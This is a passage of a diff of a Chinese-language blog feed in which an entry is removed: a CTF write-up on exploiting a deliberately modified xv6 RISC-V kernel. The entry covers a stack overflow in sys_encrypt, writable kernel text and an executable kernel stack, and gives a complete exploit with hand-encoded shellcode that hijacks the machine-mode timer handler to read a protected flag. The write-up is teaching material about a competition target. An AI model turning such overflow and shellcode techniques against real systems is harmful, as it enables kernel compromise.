-    <span class="n">argint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dstlen</span><span class="p">);</span>  
-    <span class="n">argaddr</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">keyva</span><span class="p">);</span>  
-    <span class="n">argint</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">keylen</span><span class="p">);</span>  
-    <span class="n">keylen</span> <span class="o">=</span> <span class="n">keylen</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="o">?</span> <span class="n">keylen</span><span class="o">:</span> <span class="mi">256</span><span class="p">;</span>  
-    <span class="n">copyin</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">pagetable</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)(</span><span class="n">keyva</span><span class="p">),</span> <span class="n">keylen</span><span class="p">);</span>  
-    <span class="k">while</span><span class="p">(</span><span class="n">l</span> <span class="o">&lt;</span> <span class="n">srclen</span><span class="p">){</span>  
-        <span class="n">uint</span> <span class="n">len_in_round</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  
-        <span class="c1">// copy in src. stack overflow here  </span>
-        <span class="k">while</span><span class="p">(</span><span class="n">len_in_round</span> <span class="o">&lt;</span> <span class="mi">256</span> <span class="o">&amp;&amp;</span> <span class="n">len_in_round</span> <span class="o">&lt;</span> <span class="n">srclen</span><span class="p">){</span>  
-            <span class="n">copyin</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">pagetable</span><span class="p">,</span> <span class="n">buffer</span> <span class="o">+</span> <span class="n">len_in_round</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)(</span><span class="n">src</span> <span class="o">+</span> <span class="n">len_in_round</span><span class="p">),</span> <span class="n">keylen</span><span class="p">);</span>  
-            <span class="n">len_in_round</span> <span class="o">+=</span> <span class="n">keylen</span><span class="p">;</span>  
-        <span class="p">}</span>  
-        <span class="k">for</span><span class="p">(</span><span class="n">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len_in_round</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>  
-            <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">keylen</span><span class="p">];</span>  
-        <span class="p">}</span>  
-        <span class="n">copyout</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">pagetable</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)(</span><span class="n">dst</span> <span class="o">+</span> <span class="n">l</span><span class="p">),</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len_in_round</span><span class="p">);</span>  
-        <span class="n">l</span> <span class="o">+=</span> <span class="n">len_in_round</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>虽然函数的第一个 <code class="language-plaintext highlighter-rouge">copyin</code> 处对大小作了检查与限制（0x100），但第二个循环 <code class="language-plaintext highlighter-rouge">copyin</code> 很容易就会导致溢出。只要合理构造参数，我们就可以通过 <code class="language-plaintext highlighter-rouge">bufff</code> 溢出到高位。</p>
-
-<p>第二个漏洞是页表的权限保护不当问题，原版 xv6 是没有这个问题的，而作者为了让题目能打所以手动改出了一些漏洞。</p>
-
-<p>首先是内核代码可写。映射内核页表的代码位于 <code class="language-plaintext highlighter-rouge">vm.c-kvmmake()</code> 中，本来是长这样的：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
-<span class="n">kvmmap</span><span class="p">(</span><span class="n">kpgtbl</span><span class="p">,</span> <span class="n">KERNBASE</span><span class="p">,</span> <span class="n">KERNBASE</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)</span><span class="n">etext</span><span class="o">-</span><span class="n">KERNBASE</span><span class="p">,</span> <span class="n">PTE_R</span> <span class="o">|</span> <span class="n">PTE_X</span><span class="p">);</span>
-<span class="p">...</span>
-</code></pre></div></div>
-
-<p>经过魔改后变成了这样（C 以及对应汇编）：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kvmmap</span><span class="p">(</span><span class="n">kpgtbl</span><span class="p">,</span> <span class="n">KERNBASE</span><span class="p">,</span> <span class="n">KERNBASE</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)</span><span class="n">etext</span><span class="o">-</span><span class="n">KERNBASE</span><span class="p">,</span> <span class="n">PTE_R</span> <span class="o">|</span> <span class="n">PTE_W</span> <span class="o">|</span> <span class="n">PTE_X</span><span class="p">);</span>
-</code></pre></div></div>
-
-<pre><code class="language-RISC-V">.text:00000000800011FA                 la              s2, etext
-.text:0000000080001202                 li              a4, 1110b
-.text:0000000080001204                 la              a3, 8000h
-.text:000000008000120C                 li              a2, 1
-.text:000000008000120E                 slli            a2, a2, 1Fh
-.text:0000000080001210                 mv              a1, a2
-.text:0000000080001212                 mv              a0, s1
-.text:0000000080001214                 call            kvmmap
-</code></pre>
-
-<p>其次是进程内核栈可执行，代码位于 <code class="language-plaintext highlighter-rouge">proc.c</code> 中，原来长这样：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Allocate a page for each process's kernel stack.</span>
-<span class="c1">// Map it high in memory, followed by an invalid</span>
-<span class="c1">// guard page.</span>
-<span class="kt">void</span>
-<span class="nf">proc_mapstacks</span><span class="p">(</span><span class="n">pagetable_t</span> <span class="n">kpgtbl</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
-  
-  <span class="k">for</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">proc</span><span class="p">;</span> <span class="n">p</span> <span class="o">&lt;</span> <span class="o">&amp;</span><span class="n">proc</span><span class="p">[</span><span class="n">NPROC</span><span class="p">];</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">char</span> <span class="o">*</span><span class="n">pa</span> <span class="o">=</span> <span class="n">kalloc</span><span class="p">();</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">pa</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
-      <span class="n">panic</span><span class="p">(</span><span class="s">"kalloc"</span><span class="p">);</span>
-    <span class="n">uint64</span> <span class="n">va</span> <span class="o">=</span> <span class="n">KSTACK</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="n">proc</span><span class="p">));</span>
-    <span class="n">kvmmap</span><span class="p">(</span><span class="n">kpgtbl</span><span class="p">,</span> <span class="n">va</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)</span><span class="n">pa</span><span class="p">,</span> <span class="n">PGSIZE</span><span class="p">,</span> <span class="n">PTE_R</span> <span class="o">|</span> <span class="n">PTE_W</span><span class="p">);</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>经过魔改后变成了这样（伪代码以及汇编）：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kvmmap</span><span class="p">(</span><span class="n">kpgtbl</span><span class="p">,</span> <span class="n">va</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)</span><span class="n">pa</span><span class="p">,</span> <span class="n">PGSIZE</span><span class="p">,</span> <span class="n">PTE_R</span> <span class="o">|</span> <span class="n">PTE_W</span> <span class="o">|</span> <span class="n">PTE_X</span><span class="p">);</span>
-</code></pre></div></div>
-
-<pre><code class="language-RISC-V">.text:00000000800018CA                 li              a4, 1110b
-.text:00000000800018CC                 lui             a3, 1
-.text:00000000800018CE                 sub             a1, s2, a1
-.text:00000000800018D2                 mv              a0, s3
-.text:00000000800018D4                 call            kvmmap
-</code></pre>
-
-<p>因此，结合 xv6 没有随机化的特性，我们可以在栈上打 shellcode，且连 NOP Sled 都不用嘿嘿。</p>
-
-<h2 id="漏洞利用">漏洞利用</h2>
-
-<p>最初的步骤：如何构造 <code class="language-plaintext highlighter-rouge">sys_encrypt</code> 参数、以及劫持返回地址、以及栈上的 shellcode 执行略去不表（算一下调一下就好 hhhh）。这里就假设我们已经可以任意执行代码了。</p>
-
-<p>为了绕过 PMP 保护，我想到了几种思路：</p>
-
-<h3 id="找到未被保护的flag">找到未被保护的Flag</h3>
-
-<p>由于 Flag 是硬编码在 kernel 文件中的，因此我首先想到的办法是<strong>泄露服务器端的 kernel 文件</strong>。但是 xv6 在生成文件系统的时候，并不会将 kernel 放在里面。
-我们使用 qemu 启动 xv6 时直接指定了编译好的 kernel，qemu 会把 kernel 直接加载到内存中。</p>
-
-<p>所以在 xv6 系统内，内核只存在于内存中且独一无二，这种方法被证实是不行的（</p>
-
-<h3 id="reset">RESET</h3>
-
-<p>在阅读 RISC-V 手册时，我注意到在 machine mode 中有一个小章节介绍了 Reset 。此时我已经发现了内核代码是可修改的，因此我想到的办法就是将 <code class="language-plaintext highlighter-rouge">start</code> 函数中对 <code class="language-plaintext highlighter-rouge">flag</code> 施加保护的代码覆写为 <code class="language-plaintext highlighter-rouge">nop</code> ，然后进行重启，这样重启后的系统就不会再有对 <code class="language-plaintext highlighter-rouge">flag</code> 的保护。</p>
-
-<p><strong>重启并不是 CPU 负责的事</strong>（CPU 负责的都是计算），准确来说并不是一个指令集所关心的事情。通常，重启是通过 CPU <strong>向主板设备发送信号</strong>来完成的。
-在题目环境中，启动 <code class="language-plaintext highlighter-rouge">qemu</code> 时指定使用的主板是 <code class="language-plaintext highlighter-rouge">virt</code> ，一个只具有最基础功能的主板，其描述见 <a href="https://www.qemu.org/docs/master/system/riscv/virt.html">‘virt’ Generic Virtual Platform (virt) — QEMU documentation</a>。</p>
-
-<p>如何知道这个设备能否重启、如何重启呢？反正上面这个文档里我没找到（悲）。
-我在 qemu 的源码中找到了该主板设备负责注册重启功能的函数：<a href="https://github.com/qemu/qemu/blob/master/hw/riscv/virt.c#L904">qemu/hw/riscv/virt.c at master · qemu/qemu (github.com)</a>，具体来说是如下几行：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">qemu_fdt_setprop_cells</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"reg"</span><span class="p">,</span>
-        <span class="mh">0x0</span><span class="p">,</span> <span class="n">memmap</span><span class="p">[</span><span class="n">VIRT_TEST</span><span class="p">].</span><span class="n">base</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="n">memmap</span><span class="p">[</span><span class="n">VIRT_TEST</span><span class="p">].</span><span class="n">size</span><span class="p">);</span>
-    <span class="n">qemu_fdt_setprop_cell</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"phandle"</span><span class="p">,</span> <span class="n">test_phandle</span><span class="p">);</span>
-    <span class="n">test_phandle</span> <span class="o">=</span> <span class="n">qemu_fdt_get_phandle</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
-    <span class="n">g_free</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
-
-    <span class="n">name</span> <span class="o">=</span> <span class="n">g_strdup_printf</span><span class="p">(</span><span class="s">"/reboot"</span><span class="p">);</span>
-    <span class="n">qemu_fdt_add_subnode</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
-    <span class="n">qemu_fdt_setprop_string</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"compatible"</span><span class="p">,</span> <span class="s">"syscon-reboot"</span><span class="p">);</span>
-    <span class="n">qemu_fdt_setprop_cell</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"regmap"</span><span class="p">,</span> <span class="n">test_phandle</span><span class="p">);</span>
-    <span class="n">qemu_fdt_setprop_cell</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"offset"</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
-    <span class="n">qemu_fdt_setprop_cell</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"value"</span><span class="p">,</span> <span class="n">FINISHER_RESET</span><span class="p">);</span>
-    <span class="n">g_free</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
-</code></pre></div></div>
-
-<p>从这里的代码我们可以大致猜到，映射所采用的是 mmio 方法，地址 <code class="language-plaintext highlighter-rouge">VIRT_TEST</code> 偏移 0 处，如果写入 <code class="language-plaintext highlighter-rouge">FINISHER_RESET</code> 的话就可以进行重启。借助 Github 右栏的引用查找功能，不难找到 <code class="language-plaintext highlighter-rouge">VIRT_TEST</code> 的值为 <code class="language-plaintext highlighter-rouge">0x100000</code>，<code class="language-plaintext highlighter-rouge">FINISHER_RESET</code> 的值为 0x7777。</p>
-
-<p>经过测试，确实可以通过这个方法来 reset 机器。但是我悲伤地发现在 reset 之后，我对内核代码做的修改也一起 reset 了。看来 qemu 每次 reset 都会重新加载一遍 kernel 文件啊。</p>
-
-<h3 id="修改-timervec">修改 timervec</h3>
-
-<p>在测试完上面那种方法不可行后，我就想到了这个方法，但此时离结束比赛只剩下半小时，因此非常可惜没有做完。（后来看官方的 wp 又得知了一些 trick，说不定我自己调也还要调半天）</p>
-
-<p>既然 PMP 只有 machine mode 可以操控或无视，那么我们的目标就是想方设法进入 machine mode。
-正好，xv6 对于 timer interrupt 的处理是位于 machine mode 中的。具体来说，会在 <code class="language-plaintext highlighter-rouge">start</code> 函数中调用 <code class="language-plaintext highlighter-rouge">timerinit</code>，来将 <code class="language-plaintext highlighter-rouge">timervec</code> 函数注册到 mtvec 中：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// arrange to receive timer interrupts.</span>
-<span class="c1">// they will arrive in machine mode at</span>
-<span class="c1">// at timervec in kernelvec.S,</span>
-<span class="c1">// which turns them into software interrupts for</span>
-<span class="c1">// devintr() in trap.c.</span>
-<span class="kt">void</span>
-<span class="nf">timerinit</span><span class="p">()</span>
-<span class="p">{</span>
-  <span class="p">...</span>
-
-  <span class="c1">// set the machine-mode trap handler.</span>
-  <span class="n">w_mtvec</span><span class="p">((</span><span class="n">uint64</span><span class="p">)</span><span class="n">timervec</span><span class="p">);</span>
-
-  <span class="c1">// enable machine-mode interrupts.</span>
-  <span class="n">w_mstatus</span><span class="p">(</span><span class="n">r_mstatus</span><span class="p">()</span> <span class="o">|</span> <span class="n">MSTATUS_MIE</span><span class="p">);</span>
-
-  <span class="c1">// enable machine-mode timer interrupts.</span>
-  <span class="n">w_mie</span><span class="p">(</span><span class="n">r_mie</span><span class="p">()</span> <span class="o">|</span> <span class="n">MIE_MTIE</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>因此，实际上内核在启动进入 supervisor mode 之后，唯一使用 machine mode 执行的代码就是这个 timervec 函数了，实现位于 <code class="language-plaintext highlighter-rouge">kernelvec.S</code> 中：</p>
-
-<pre><code class="language-RISC-V">.globl timervec
-.align 4
-timervec:
-        # start.c has set up the memory that mscratch points to:
-        # scratch[0,8,16] : register save area.
-        # scratch[24] : address of CLINT's MTIMECMP register.
-        # scratch[32] : desired interval between interrupts.
-        
-        csrrw a0, mscratch, a0
-        sd a1, 0(a0)
-        sd a2, 8(a0)
-        sd a3, 16(a0)
-
-        # schedule the next timer interrupt
-        # by adding interval to mtimecmp.
-        ld a1, 24(a0) # CLINT_MTIMECMP(hart)
-        ld a2, 32(a0) # interval
-        ld a3, 0(a1)
-        add a3, a3, a2
-        sd a3, 0(a1)
-
-        # arrange for a supervisor software interrupt
-        # after this handler returns.
-        li a1, 2
-        csrw sip, a1
-
-        ld a3, 16(a0)
-        ld a2, 8(a0)
-        ld a1, 0(a0)
-        csrrw a0, mscratch, a0
-
-        mret
-</code></pre>
-
-<p>这是一个会不定期被触发的、位于 machine mode 中的函数，这个函数的实现位于内核中，且是<strong>可以修改的</strong>。
-所以我们劫持这个函数调用 backdoor，就可以让 backdoor 函数在 machine mode 被执行了，从而打印出 Flag。</p>
-
-<p>（这里本来脑子没转过来，想的是让 timervec 把 PMP 给关了，然后我自己调用 backdoor，但这种方法增加了复杂度，不如直接调用 backdoor 简洁）</p>
-
-<p>此外还有一个注意点，就是在进入 timervec 之后，需要使用 <code class="language-plaintext highlighter-rouge">csrw mie, x0</code> （machine-mode interrupt enable）来关闭 machine mode 的各种中断。否则，在读 flag 读一半触发这个中断就不好了。（看官网 wp 学到的）</p>
-
-<p>我的 exp 如下：</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"kernel/types.h"</span><span class="cp">
-#include</span> <span class="cpf">"kernel/stat.h"</span><span class="cp">
-#include</span> <span class="cpf">"user/user.h"</span><span class="cp">
-</span>
-<span class="cm">/*  hijack timervec:
- *   30401073          	 csrr   mie,x0 (disable timer interrupt)
- *   00060067            jr     a2
- */</span>
-
-<span class="n">uint32</span> <span class="n">a1</span><span class="p">[</span><span class="mh">0x140</span><span class="o">/</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="mh">0x00040637</span><span class="p">,</span>     <span class="c1">// li a2, 0x80006214</span>
-    <span class="mh">0x0036061b</span><span class="p">,</span>
-    <span class="mh">0x00d61613</span><span class="p">,</span>
-    <span class="mh">0x21460613</span><span class="p">,</span>
-
-    <span class="mh">0x00040537</span><span class="p">,</span>     <span class="c1">// li a0, 0x80005BF0</span>
-    <span class="mh">0x0035051b</span><span class="p">,</span>
-    <span class="mh">0x00d51513</span><span class="p">,</span>
-    <span class="mh">0xbf050513</span><span class="p">,</span>
-
-    <span class="mh">0x304015b7</span><span class="p">,</span>     <span class="c1">// li a1, 0x30401073</span>
-    <span class="mh">0x0735859b</span><span class="p">,</span>
-    <span class="mh">0x00b53023</span><span class="p">,</span>     <span class="c1">// sd a1, (a0)</span>
-    <span class="mh">0x00450513</span><span class="p">,</span>     <span class="c1">// addi a0, a0, 4</span>
-
-    <span class="mh">0x000605b7</span><span class="p">,</span>     <span class="c1">// li a1, 0x00060067</span>
-    <span class="mh">0x0675859b</span><span class="p">,</span>
-    <span class="mh">0x00b53023</span><span class="p">,</span>     <span class="c1">// sd a1, (a0)</span>
-
-    <span class="mh">0x0000006f</span><span class="p">,</span>     <span class="c1">// infinte loop</span>
-<span class="p">};</span>
-<span class="kt">char</span> <span class="n">a3</span><span class="p">[</span><span class="mh">0x140</span><span class="p">];</span>
-<span class="kt">char</span> <span class="n">a5</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">[</span><span class="mh">0x138</span><span class="o">/</span><span class="mi">4</span><span class="p">])</span> <span class="o">=</span> <span class="mh">0x3fffff9e80</span><span class="p">;</span>  <span class="c1">// ra = 0x3fffff9e80 shellcode</span>
-    <span class="n">encrypt</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">);</span>
-    
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>另外还有一个坑，就是 backdoor 函数前 N 句汇编是一些栈相关操作，我们需要跳过这几句汇编。否则内核会卡住不动！太坑了！</p>
-
-<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202311290204319.png" alt="" /></p>]]></content><author><name></name></author><category term="pwn" /><category term="riscv" /><category term="kernel-pwn" /><summary type="html"><![CDATA[第一次打内核题，虽然是xv6但还是感觉非常酷。比赛结束前才想到了真的可行的思路，赛后结合官方 writeup 调出来了。]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name></name></author><category term="pwn" /><category term="qemu" /><summary type="html"><![CDATA[第一次从qemu里面逃出来，但没有完全逃出来，远程没通比赛就结束了S.H.I.T]]></summary></entry></feed>
